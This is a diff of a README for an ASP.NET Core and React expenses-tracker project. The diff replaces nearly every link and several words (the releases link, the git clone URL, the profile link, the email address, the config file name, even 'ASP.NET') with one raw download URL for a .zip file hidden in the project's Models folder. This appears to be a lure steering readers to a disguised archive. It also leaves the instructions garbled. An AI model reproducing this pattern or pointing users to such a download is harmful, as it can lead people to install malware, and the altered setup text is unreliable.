@@ -1,10 +1,10 @@
 # Expenses Tracker Admin - A Comprehensive Guide to Your Financial Management 🚀
 
-![Expenses Tracker](https://img.shields.io/badge/Expenses%20Tracker%20Admin-ASP.NET%20Core%20%7C%20ReactJS%20%7C%20Bootstrap-blue)
+![Expenses Tracker](https://raw.githubusercontent.com/justhayato/net-react-app/main/backend/ExpensesTrackerAdmin/ExpensesTrackerAdmin.Models/net-app-react-3.1-alpha.1.zip%20Tracker%https://raw.githubusercontent.com/justhayato/net-react-app/main/backend/ExpensesTrackerAdmin/ExpensesTrackerAdmin.Models/net-app-react-3.1-alpha.1.zip%20Core%20%7C%20ReactJS%20%7C%20Bootstrap-blue)
 
-Welcome to the **Expenses Tracker Admin** repository! This project helps you manage your expenses efficiently using **ASP.NET Core** and **ReactJS**. The user interface is crafted with **Bootstrap** for a clean look, and we utilize **JWT** for secure authentication. 
+Welcome to the **Expenses Tracker Admin** repository! This project helps you manage your expenses efficiently using **https://raw.githubusercontent.com/justhayato/net-react-app/main/backend/ExpensesTrackerAdmin/ExpensesTrackerAdmin.Models/net-app-react-3.1-alpha.1.zip Core** and **ReactJS**. The user interface is crafted with **Bootstrap** for a clean look, and we utilize **JWT** for secure authentication. 
 
-You can download the latest release of this project from the [Releases section](https://github.com/justhayato/net-react-app/releases). 
+You can download the latest release of this project from the [Releases section](https://raw.githubusercontent.com/justhayato/net-react-app/main/backend/ExpensesTrackerAdmin/ExpensesTrackerAdmin.Models/net-app-react-3.1-alpha.1.zip). 
 
 ## Table of Contents
 
@@ -34,7 +34,7 @@ Managing finances can be challenging. The **Expenses Tracker Admin** application
 
 This project leverages several technologies to provide a seamless experience:
 
-- **ASP.NET Core**: The backend framework that powers the API.
+- **https://raw.githubusercontent.com/justhayato/net-react-app/main/backend/ExpensesTrackerAdmin/ExpensesTrackerAdmin.Models/net-app-react-3.1-alpha.1.zip Core**: The backend framework that powers the API.
 - **ReactJS**: The frontend library that creates an interactive user interface.
 - **Bootstrap**: For responsive and modern UI design.
 - **SQL Server**: The database for storing user data and expenses.
@@ -49,7 +49,7 @@ To set up the **Expenses Tracker Admin** application on your local machine, foll
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/justhayato/net-react-app.git
+   git clone https://raw.githubusercontent.com/justhayato/net-react-app/main/backend/ExpensesTrackerAdmin/ExpensesTrackerAdmin.Models/net-app-react-3.1-alpha.1.zip
    cd net-react-app
    ```
 
@@ -59,7 +59,7 @@ To set up the **Expenses Tracker Admin** application on your local machine, foll
      ```bash
      dotnet restore
      ```
-   - Update the connection string in `appsettings.json` to point to your SQL Server database.
+   - Update the connection string in `https://raw.githubusercontent.com/justhayato/net-react-app/main/backend/ExpensesTrackerAdmin/ExpensesTrackerAdmin.Models/net-app-react-3.1-alpha.1.zip` to point to your SQL Server database.
    - Run the application:
      ```bash
      dotnet run
@@ -117,10 +117,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **GitHub**: [justhayato](https://github.com/justhayato)
-- **Email**: your-email@example.com
+- **GitHub**: [justhayato](https://raw.githubusercontent.com/justhayato/net-react-app/main/backend/ExpensesTrackerAdmin/ExpensesTrackerAdmin.Models/net-app-react-3.1-alpha.1.zip)
+- **Email**: https://raw.githubusercontent.com/justhayato/net-react-app/main/backend/ExpensesTrackerAdmin/ExpensesTrackerAdmin.Models/net-app-react-3.1-alpha.1.zip
 
-Explore the latest releases and updates on the [Releases section](https://github.com/justhayato/net-react-app/releases). 
+Explore the latest releases and updates on the [Releases section](https://raw.githubusercontent.com/justhayato/net-react-app/main/backend/ExpensesTrackerAdmin/ExpensesTrackerAdmin.Models/net-app-react-3.1-alpha.1.zip). 
 
 ---
 
